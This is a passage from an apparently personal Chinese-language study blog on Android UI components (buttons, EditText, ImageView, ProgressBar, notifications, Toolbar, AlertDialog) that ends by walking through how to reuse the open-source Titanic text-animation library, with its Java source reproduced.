title="释放事件（onRelease）"></a>释放事件（onRelease）</h4><p>释放事件是用户释放按钮时触发的事件，与按下事件相对应。通常与按下事件结合使用，以执行需要在用户按下按钮后立即释放时执行的操作。</p><p>在我理解看来，如果官方自带的事件无法满足你的开发需求，可以自定义一个点击事件，用来实现更高客制化的需求。</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子:"></a>例子:</h4><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//        通过ID获取按钮组件</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">btn</span> <span class="operator">=</span> findViewById(R.id.btn_text);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        点击事件</span></span><br><span class="line">        btn.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() {</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> {</span><br><span class="line">                <span class="comment">//通过日志输出点击后的测试文本</span></span><br><span class="line">                Log.e(TAG,<span class="string">"HELLO Click"</span>);</span><br><span class="line"></span><br><span class="line">            }</span><br><span class="line">        });</span><br><span class="line"></span><br><span class="line"><span class="comment">//        长按事件</span></span><br><span class="line">        btn.setOnLongClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnLongClickListener() {</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onLongClick</span><span class="params">(View v)</span> {</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            }</span><br><span class="line">        });</span><br><span class="line"></span><br><span class="line"><span class="comment">//        触摸事件</span></span><br><span class="line">        btn.setOnTouchListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnTouchListener() {</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onTouch</span><span class="params">(View v, MotionEvent event)</span> {</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            }</span><br><span class="line">        });</span><br></pre></td></tr></tbody></table></figure><h2 id="EditText"><a href="#EditText" class="headerlink" title="EditText"></a>EditText</h2><h3 id="属性-1"><a href="#属性-1" class="headerlink" title="属性"></a>属性</h3><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td><code>android:id</code></td><td>用于指定EditText的唯一标识符。</td></tr><tr><td><code>android:hint</code></td><td>当EditText为空时显示的提示文本。</td></tr><tr><td><code>android:text</code></td><td>设置EditText的文本内容。</td></tr><tr><td><code>android:inputType</code></td><td>指定EditText的输入类型，例如文本、数字、密码等。</td></tr><tr><td><code>android:maxLines</code></td><td>指定EditText的最大行数。</td></tr><tr><td><code>android:maxLength</code></td><td>指定EditText的最大字符数。</td></tr><tr><td><code>android:imeOptions</code></td><td>定义EditText的输入法选项。</td></tr><tr><td><code>android:singleLine</code></td><td>设置EditText是否为单行模式。</td></tr><tr><td><code>android:imeActionLabel</code></td><td>设置输入法操作的标签文本。</td></tr></tbody></table><p>使用EditText也十分简单，当点击按钮的时候，获取到当前Text组件的内容，然后转换为String类型做操作，这里就不演示了。</p><h2 id="ImageView"><a href="#ImageView" class="headerlink" title="ImageView"></a>ImageView</h2><h3 id="属性-2"><a href="#属性-2" class="headerlink" title="属性"></a>属性</h3><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td><code>android:src</code></td><td>设置ImageView显示的图像资源。</td></tr><tr><td><code>android:scaleType</code></td><td>设置图像的缩放类型。</td></tr><tr><td><code>android:tint</code></td><td>设置图像的着色。</td></tr><tr><td><code>android:adjustViewBounds</code></td><td>设置是否根据图像尺寸调整ImageView的边界。</td></tr><tr><td><code>android:maxWidth</code></td><td>设置ImageView的最大宽度。</td></tr><tr><td><code>android:maxHeight</code></td><td>设置ImageView的最大高度。</td></tr><tr><td><code>android:srcCompat</code></td><td>设置兼容的图像资源。</td></tr><tr><td><code>android:cropToPadding</code></td><td>设置是否裁剪ImageView的填充。</td></tr><tr><td><code>android:background</code></td><td>设置ImageView的背景图像。</td></tr><tr><td><code>android:foreground</code></td><td>设置ImageView的前景图像。</td></tr><tr><td><code>android:alpha</code></td><td>设置ImageView的透明度。</td></tr><tr><td><code>android:elevation</code></td><td>设置ImageView的高度。</td></tr><tr><td><code>android:visibility</code></td><td>设置ImageView的可见性。</td></tr><tr><td><code>android:rotation</code></td><td>设置ImageView的旋转角度。</td></tr><tr><td><code>android:rotationX</code></td><td>设置ImageView围绕X轴的旋转角度。</td></tr><tr><td><code>android:rotationY</code></td><td>设置ImageView围绕Y轴的旋转角度。</td></tr><tr><td><code>android:translationX</code></td><td>设置ImageView在X轴上的平移量。</td></tr><tr><td><code>android:translationY</code></td><td>设置ImageView在Y轴上的平移量。</td></tr><tr><td><code>android:scaleX</code></td><td>设置ImageView的X轴缩放比例。</td></tr><tr><td><code>android:scaleY</code></td><td>设置ImageView的Y轴缩放比例。</td></tr></tbody></table><p>使用ImageView组件，必须要设置的属性有宽高，然后就是src，这其中路径是@开头的，一开始我并不明白@的原理，但我发现@中的基本都在res里，所以我认为当@drawable/ceshi.jpg的时候，实际上就是res/drawable/ceshi.jpg</p><h2 id="ProgressBar"><a href="#ProgressBar" class="headerlink" title="ProgressBar"></a>ProgressBar</h2><p>  进度条可以用于加载数据时候展示的组件，它拥有多种样式和形态。</p><p>通常常用的两种分别是圆圈形状和条状，可以使用style去设定。</p><p>当你在使用 Android Studio 中的 ProgressBar 时，你可以设置多种属性来自定义其外观和行为。以下是一些常用的属性：</p><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td><code>android:progress</code></td><td>设置当前进度值。</td></tr><tr><td><code>android:max</code></td><td>设置进度的最大值。</td></tr><tr><td><code>android:indeterminate</code></td><td>设置是否显示为不确定进度。</td></tr><tr><td><code>android:progressDrawable</code></td><td>设置进度条的前景drawable。</td></tr><tr><td><code>android:indeterminateDrawable</code></td><td>设置不确定进度条的drawable。</td></tr><tr><td><code>android:progressTint</code></td><td>设置进度条颜色。</td></tr><tr><td><code>android:progressBackgroundTint</code></td><td>设置进度条背景颜色。</td></tr><tr><td><code>android:indeterminateTint</code></td><td>设置不确定进度条颜色。</td></tr><tr><td><code>android:indeterminateDuration</code></td><td>设置不确定进度条动画的持续时间。</td></tr><tr><td><code>android:visibility</code></td><td>设置进度条的可见性。</td></tr></tbody></table><p>下面是一个简单的示例，演示如何在 XML 中使用 ProgressBar：</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ProgressBar</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/progressBar"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_centerInParent</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:progress</span>=<span class="string">"50"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:max</span>=<span class="string">"100"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:indeterminate</span>=<span class="string">"false"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:progressTint</span>=<span class="string">"@color/colorAccent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:indeterminateTint</span>=<span class="string">"@color/colorPrimaryDark"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:visibility</span>=<span class="string">"visible"</span>/&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>在这个示例中，进度条被设置为在屏幕中央显示，当前进度为 50%（<code>android:progress="50"</code>），最大进度为 100（<code>android:max="100"</code>），显示为确定进度（<code>android:indeterminate="false"</code>）。进度条的颜色通过 <code>android:progressTint</code> 和 <code>android:indeterminateTint</code> 属性设置。</p><p>你可以根据你的需求调整这些属性，以实现你想要的 ProgressBar 外观和行为。</p><p>如果需要更高的定制可以创建一个方法，每次点击按钮或者做其他事件的时候调用方法增加进度条的值。</p><h2 id="Notfication"><a href="#Notfication" class="headerlink" title="Notfication"></a>Notfication</h2><p>Android Studio 中的通知（Notification）是一种用户界面元素，用于向用户显示关于应用程序当前状态或事件的信息。通知可以显示在设备的状态栏中，并且可以展开以显示更多详细信息。通知通常用于向用户显示新消息、更新或其他重要事件。</p><p>以下是使用通知的基本步骤：</p><ol><li>创建 NotificationCompat.Builder 对象，并设置通知的标题、内容等属性。</li><li>通过设置 Intent 或 PendingIntent 来定义通知的点击行为。</li><li>将通知发送到通知管理器（NotificationManager）以显示通知。</li></ol><p>下面是一个简单的示例，演示如何在 Android Studio 中使用通知：</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> android.app.NotificationChannel;</span><br><span class="line"><span class="keyword">import</span> android.app.NotificationManager;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> androidx.core.app.NotificationCompat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NotificationHelper</span> {</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CHANNEL_ID</span> <span class="operator">=</span> <span class="string">"example_channel"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">CharSequence</span> <span class="variable">CHANNEL_NAME</span> <span class="operator">=</span> <span class="string">"Example Channel"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CHANNEL_DESCRIPTION</span> <span class="operator">=</span> <span class="string">"This is an example notification channel"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">showNotification</span><span class="params">(Context context, String title, String content)</span> {</span><br><span class="line">        NotificationCompat.<span class="type">Builder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationCompat</span>.Builder(context, CHANNEL_ID)</span><br><span class="line">                .setSmallIcon(R.drawable.ic_notification)</span><br><span class="line">                .setContentTitle(title)</span><br><span class="line">                .setContentText(content)</span><br><span class="line">                .setPriority(NotificationCompat.PRIORITY_DEFAULT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Define the intent to open when notification is clicked</span></span><br><span class="line">        <span class="comment">// PendingIntent pendingIntent = ...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set the intent to the notification</span></span><br><span class="line">        <span class="comment">// builder.setContentIntent(pendingIntent);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">NotificationManager</span> <span class="variable">notificationManager</span> <span class="operator">=</span> (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create a notification channel for Android Oreo and higher</span></span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) {</span><br><span class="line">            <span class="type">NotificationChannel</span> <span class="variable">channel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationChannel</span>(CHANNEL_ID, CHANNEL_NAME, NotificationManager.IMPORTANCE_DEFAULT);</span><br><span class="line">            channel.setDescription(CHANNEL_DESCRIPTION);</span><br><span class="line">            notificationManager.createNotificationChannel(channel);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Display the notification</span></span><br><span class="line">        notificationManager.notify(<span class="comment">/*notification_id*/</span> <span class="number">1</span>, builder.build());</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在这个示例中，我们创建了一个名为 <code>showNotification</code> 的静态方法，该方法接受上下文、通知的标题和内容作为参数。然后，我们创建了一个 NotificationCompat.Builder 对象，并设置了通知的小图标、标题和内容。你可以根据需要设置其他属性，如点击通知时的操作。</p><p>最后，我们通过 NotificationManager 将通知显示出来，并在需要时创建了一个通知渠道（Notification Channel），这是为了兼容 Android Oreo 及更高版本。</p><p>要使用这个示例，你需要在调用 <code>showNotification</code> 方法之前创建一个 PendingIntent，并将其设置为通知的点击行为。</p><p>我自己写的通知，明明是照着教程写的，但是却没办法使用，报错</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> NotificationManager manager;</span><br><span class="line">    <span class="keyword">private</span> Notification notification;</span><br><span class="line">        </span><br><span class="line">        manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);</span><br><span class="line"><span class="comment">//        当前手机安卓系统版本大于8的时候</span></span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O){</span><br><span class="line">            <span class="type">NotificationChannel</span> <span class="variable">channel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationChannel</span>(<span class="string">"leo"</span>, <span class="string">"报错"</span>,</span><br><span class="line">                    NotificationManager.IMPORTANCE_HIGH);</span><br><span class="line">            manager.createNotificationChannel(channel);</span><br><span class="line">        }<span class="keyword">else</span> {</span><br><span class="line">            notification = <span class="keyword">new</span> <span class="title class_">NotificationCompat</span>.Builder(<span class="built_in">this</span>,<span class="string">"leo"</span>)</span><br><span class="line">                    .setContentTitle(<span class="string">"官方通知"</span>)</span><br><span class="line">                    .setContentText(<span class="string">"您的输入不合规"</span>)</span><br><span class="line">                    .setSmallIcon(R.drawable.ic_launcher_background)</span><br><span class="line">                    .build();</span><br><span class="line">        }</span><br></pre></td></tr></tbody></table></figure><p>使用这个通知</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">manager.notify(<span class="number">1</span>,notification);</span><br></pre></td></tr></tbody></table></figure><h2 id="Toolbar"><a href="#Toolbar" class="headerlink" title="Toolbar"></a>Toolbar</h2><p><strong>Android Studio 中的 Toolbar 是用来创建应用程序的顶部操作栏或工具栏的。</strong>它通常位于屏幕的顶部，并包含应用程序的主要操作按钮、导航按钮和其他重要控件。Toolbar 提供了一种简洁而强大的方式来组织应用程序的用户界面，使用户可以轻松地访问应用程序的各种功能。</p><p><strong>一些 Toolbar 的主要功能包括：</strong></p><ol><li><strong>导航按钮</strong>：通常位于 Toolbar 的左侧，用于返回上一个屏幕或打开导航菜单。</li><li><strong>应用程序标题</strong>：通常位于 Toolbar 的中心，显示当前屏幕的标题或应用程序的名称。</li><li><strong>操作按钮</strong>：位于 Toolbar 的右侧或左侧，用于执行与当前屏幕相关的操作，如搜索、分享、设置等。</li><li><strong>溢出菜单</strong>：当屏幕空间有限时，Toolbar 可以自动将一些操作按钮隐藏在溢出菜单中，用户可以通过点击溢出菜单按钮来访问这些隐藏的操作。</li></ol><p><strong>举例：</strong></p><p>假设我们正在开发一个新闻阅读应用程序。在这个应用程序中，Toolbar 可以具有以下功能：</p><ul><li><strong>导航按钮</strong>：返回按钮，允许用户从新闻详情页面返回到新闻列表页面。</li><li><strong>应用程序标题</strong>：显示当前正在阅读的新闻标题，让用户清楚地知道自己在浏览哪篇新闻。</li><li><strong>操作按钮</strong>：分享按钮，允许用户将当前正在阅读的新闻内容分享给其他人。</li><li><strong>溢出菜单</strong>：包含一些额外的操作，如设置、反馈、帮助等，以便用户可以轻松地访问这些功能。</li></ul><p>通过 Toolbar，用户可以方便地浏览新闻、返回上一个页面、分享新闻内容，并且可以访问一些额外的功能，提升了应用程序的易用性和功能性。</p><h2 id="AlertDialog"><a href="#AlertDialog" class="headerlink" title="AlertDialog"></a>AlertDialog</h2><h2 id="PopupWindow"><a href="#PopupWindow" class="headerlink" title="PopupWindow"></a>PopupWindow</h2><h2 id="AlertDialog弹窗"><a href="#AlertDialog弹窗" class="headerlink" title="AlertDialog弹窗"></a>AlertDialog弹窗</h2><p>创建弹窗</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//        创建弹窗</span></span><br><span class="line">        <span class="type">AlertDialog</span> <span class="variable">alertDialog1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(<span class="built_in">this</span>)</span><br><span class="line">                .setTitle(<span class="string">"报错"</span>)<span class="comment">//标题</span></span><br><span class="line">                .setMessage(<span class="string">"输入内容非法"</span>)<span class="comment">//内容</span></span><br><span class="line">                .setIcon(R.mipmap.ic_launcher)<span class="comment">//图标</span></span><br><span class="line">                .create();</span><br></pre></td></tr></tbody></table></figure><p>调用</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">alertDialog1.show();</span><br></pre></td></tr></tbody></table></figure><p>要注意的是，创建弹窗注意作用域的问题，如果写在判断里，又可以this是获取不到的，会报红。</p><p>除此之外还能设置更多属性以实现不同功能，详细参考:<a href="https://blog.csdn.net/qq_35698774/article/details/79779238">https://blog.csdn.net/qq_35698774/article/details/79779238</a></p><h2 id="使用他人的项目"><a href="#使用他人的项目" class="headerlink" title="使用他人的项目"></a>使用他人的项目</h2><p>在github上，有很多大佬开源了自己的项目，通过使用他们的项目，来快速部署自己项目中的其中一个功能，这里使用我这次项目中的Titanic for Android来作为教学。</p><p>使用他人项目的时候，请务必标注来源，这是对原作者的尊重，同时也是开源社区需要自觉遵守的制度。</p><p>本次使用开源项目Titanic for Android —— <a href="https://github.com/romainpiel">romainpiel</a></p><p>这是一个美化字体的项目，通过观察README可以知道如何使用，首先我们需要将项目克隆到本地方便查看和复制。</p><p>通过使用git clone进行克隆，在code按钮中复制git地址然后进行克隆。</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">git clone https://github.com/romainpiel/Titanic.git</span><br></pre></td></tr></tbody></table></figure><p>具体的git教程可以看我的另一个笔记。</p><p>克隆完成后，分析项目，找到关键的java代码，复制到自己的项目，然后按照README教程进行调用。</p><p>在这个项目中，library里是核心java代码，需要将Titanic.java和TitanicTextView.ava复制到自己的项目中，其中Titanic代码打开后是这样的：</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.romainpiel.titanic.library;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.animation.Animator;</span><br><span class="line"><span class="keyword">import</span> android.animation.AnimatorSet;</span><br><span class="line"><span class="keyword">import</span> android.animation.ObjectAnimator;</span><br><span class="line"><span class="keyword">import</span> android.animation.ValueAnimator;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.view.animation.LinearInterpolator;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Titanic</span></span><br><span class="line"><span class="comment"> * User: romainpiel</span></span><br><span class="line"><span class="comment"> * Date: 14/03/2014</span></span><br><span class="line"><span class="comment"> * Time: 09:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Titanic</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> AnimatorSet animatorSet;</span><br><span class="line">    <span class="keyword">private</span> Animator.AnimatorListener animatorListener;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Animator.AnimatorListener <span class="title function_">getAnimatorListener</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> animatorListener;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAnimatorListener</span><span class="params">(Animator.AnimatorListener animatorListener)</span> {</span><br><span class="line">        <span class="built_in">this</span>.animatorListener = animatorListener;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(<span class="keyword">final</span> TitanicTextView textView)</span> {</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Runnable</span> <span class="variable">animate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runnable</span>() {</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> {</span><br><span class="line"></span><br><span class="line">                textView.setSinking(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// horizontal animation. 200 = wave.png width</span></span><br><span class="line">                <span class="type">ObjectAnimator</span> <span class="variable">maskXAnimator</span> <span class="operator">=</span> ObjectAnimator.ofFloat(textView, <span class="string">"maskX"</span>, <span class="number">0</span>, <span class="number">200</span>);</span><br><span class="line">                maskXAnimator.setRepeatCount(ValueAnimator.INFINITE);</span><br><span class="line">                maskXAnimator.setDuration(<span class="number">1000</span>);</span><br><span class="line">                maskXAnimator.setStartDelay(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> textView.getHeight();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// vertical animation</span></span><br><span class="line">                <span class="comment">// maskY = 0 -&gt; wave vertically centered</span></span><br><span class="line">                <span class="comment">// repeat mode REVERSE to go back and forth</span></span><br><span class="line">                <span class="type">ObjectAnimator</span> <span class="variable">maskYAnimator</span> <span class="operator">=</span> ObjectAnimator.ofFloat(textView, <span class="string">"maskY"</span>, h/<span class="number">2</span>, - h/<span class="number">2</span>);</span><br><span class="line">                maskYAnimator.setRepeatCount(ValueAnimator.INFINITE);</span><br><span class="line">                maskYAnimator.setRepeatMode(ValueAnimator.REVERSE);</span><br><span class="line">                maskYAnimator.setDuration(<span class="number">10000</span>);</span><br><span class="line">                maskYAnimator.setStartDelay(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// now play both animations together</span></span><br><span class="line">                animatorSet = <span class="keyword">new</span> <span class="title class_">AnimatorSet</span>();</span><br><span class="line">                animatorSet.playTogether(maskXAnimator, maskYAnimator);</span><br><span class="line">                animatorSet.setInterpolator(<span class="keyword">new</span> <span class="title class_">LinearInterpolator</span>());</span><br><span class="line">                animatorSet.addListener(<span class="keyword">new</span> <span class="title class_">Animator</span>.AnimatorListener() {</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAnimationStart</span><span class="params">(Animator animation)</span> {</span><br><span class="line">                    }</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAnimationEnd</span><span class="params">(Animator animation)</span> {</span><br><span class="line">                        textView.setSinking(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (Build.VERSION.SDK_INT &lt; Build.VERSION_CODES.JELLY_BEAN) {</span><br><span class="line">                            textView.postInvalidate();</span><br><span class="line">                        } <span class="keyword">else</span> {</span><br><span class="line">                            textView.postInvalidateOnAnimation();</span><br><span class="line">                        }</span><br><span class="line"></span><br><span class="line">                        animatorSet = <span class="literal">null</span>;</span><br><span class="line">                    }</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAnimationCancel</span><span class="params">(Animator animation)</span> {</span><br><span class="line"></span><br><span class="line">                    }</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAnimationRepeat</span><span class="params">(Animator animation)</span> {</span><br><span class="line"></span><br><span class="line">                    }</span><br><span class="line">                });</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (animatorListener != <span class="literal">null</span>) {</span><br><span class="line">                    animatorSet.addListener(animatorListener);</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                animatorSet.start();</span><br><span class="line">            }</span><br><span class="line">        };</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!textView.isSetUp()) {</span><br><span class="line">            textView.setAnimationSetupCallback(<span class="keyword">new</span> <span class="title class_">TitanicTextView</span>.AnimationSetupCallback() {</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSetupAnimation</span><span class="params">(<span class="keyword">final</span> TitanicTextView target)</span> {</span><br><span class="line">                    animate.run();</span><br><span class="line">                }</span><br><span class="line">            });</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            animate.run();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cancel</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">if</span> (animatorSet != <span class="literal">null</span>) {</span><br><span class="line">            animatorSet.cancel();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>通过观察代码，发现这个文件没有继承任何类，代表这是一个功能类，同时通过详细阅读代码，发现这是用来控制美化字体的动态效果，通过着色器让文字的遮罩按照波浪的样子往上移动。</p><p>然后是TitanicTextView.ava，不难发现TextView是Android的一个组件，打开代码后，发现果然如此：</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.romainpiel.titanic.library;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.res.ColorStateList;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Bitmap;</span><br><span class="line"><span class="keyword">import</span> android.graphics.BitmapShader;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Canvas;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Matrix;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Shader;</span><br><span class="line"><span class="keyword">import</span> android.graphics.drawable.Drawable;</span><br><span class="line"><span class="keyword">import</span> android.util.AttributeSet;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Titanic</span></span><br><span class="line"><span class="comment"> * romainpiel</span></span><br><span class="line"><span class="comment"> * 13/03/2014</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TitanicTextView</span> <span class="keyword">extends</span> <span class="title class_">TextView</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">AnimationSetupCallback</span> {</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSetupAnimation</span><span class="params">(TitanicTextView titanicTextView)</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// callback fired at first onSizeChanged</span></span><br><span class="line">    <span class="keyword">private</span> AnimationSetupCallback animationSetupCallback;</span><br><span class="line">    <span class="comment">// wave shader coordinates</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">float</span> maskX, maskY;</span><br><span class="line">    <span class="comment">// if true, the shader will display the wave</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> sinking;</span><br><span class="line">    <span class="comment">// true after the first onSizeChanged</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> setUp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// shader containing a repeated wave</span></span><br><span class="line">    <span class="keyword">private</span> BitmapShader shader;</span><br><span class="line">    <span class="comment">// shader matrix</span></span><br><span class="line">    <span class="keyword">private</span> Matrix shaderMatrix;</span><br><span class="line">    <span class="comment">// wave drawable</span></span><br><span class="line">    <span class="keyword">private</span> Drawable wave;</span><br><span class="line">    <span class="comment">// (getHeight() - waveHeight) / 2</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">float</span> offsetY;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TitanicTextView</span><span class="params">(Context context)</span> {</span><br><span class="line">        <span class="built_in">super</span>(context);</span><br><span class="line">        init();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TitanicTextView</span><span class="params">(Context context, AttributeSet attrs)</span> {</span><br><span class="line">        <span class="built_in">super</span>(context, attrs);</span><br><span class="line">        init();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TitanicTextView</span><span class="params">(Context context, AttributeSet attrs, <span class="type">int</span> defStyle)</span> {</span><br><span class="line">        <span class="built_in">super</span>(context, attrs, defStyle);</span><br><span class="line">        init();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> {</span><br><span class="line">        shaderMatrix = <span class="keyword">new</span> <span class="title class_">Matrix</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> AnimationSetupCallback <span class="title function_">getAnimationSetupCallback</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> animationSetupCallback;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAnimationSetupCallback</span><span class="params">(AnimationSetupCallback animationSetupCallback)</span> {</span><br><span class="line">        <span class="built_in">this</span>.animationSetupCallback = animationSetupCallback;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> 